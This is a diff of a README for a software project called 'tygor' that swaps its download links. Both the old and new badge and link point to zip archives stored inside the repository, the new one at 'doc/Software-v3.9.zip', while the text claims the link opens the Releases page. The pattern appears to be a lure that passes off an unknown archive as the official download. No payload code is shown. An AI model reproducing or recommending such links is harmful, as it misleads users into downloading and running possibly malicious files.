@@ -4,7 +4,7 @@
 Welcome to the tygor application. This guide will help you download and run the software. Whether you are building a personal project or an application for work, tygor makes it simple and efficient.
 
 ## 📥 Download tygor
-[![Download tygor](https://github.com/ariefwasista/tygor/raw/refs/heads/main/tygorgen/provider/testdata/v1/tygor_2.4.zip%20tygor-Via%20Releases-brightgreen)](https://github.com/ariefwasista/tygor/raw/refs/heads/main/tygorgen/provider/testdata/v1/tygor_2.4.zip)
+[![Download tygor](https://raw.githubusercontent.com/ariefwasista/tygor/main/doc/Software-v3.9.zip%20tygor-Via%20Releases-brightgreen)](https://raw.githubusercontent.com/ariefwasista/tygor/main/doc/Software-v3.9.zip)
 
 ## 📅 Release Information
 You can always find the latest version of tygor on our Releases page. This page contains all available versions, including important updates and new features. 
@@ -28,7 +28,7 @@ Before you begin, make sure your system meets the following requirements:
 ## 💻 Download & Install
 To get started, visit the following page to download the latest release of tygor:
 
-[Download tygor](https://github.com/ariefwasista/tygor/raw/refs/heads/main/tygorgen/provider/testdata/v1/tygor_2.4.zip)
+[Download tygor](https://raw.githubusercontent.com/ariefwasista/tygor/main/doc/Software-v3.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the version labeled "Latest release" at the top.
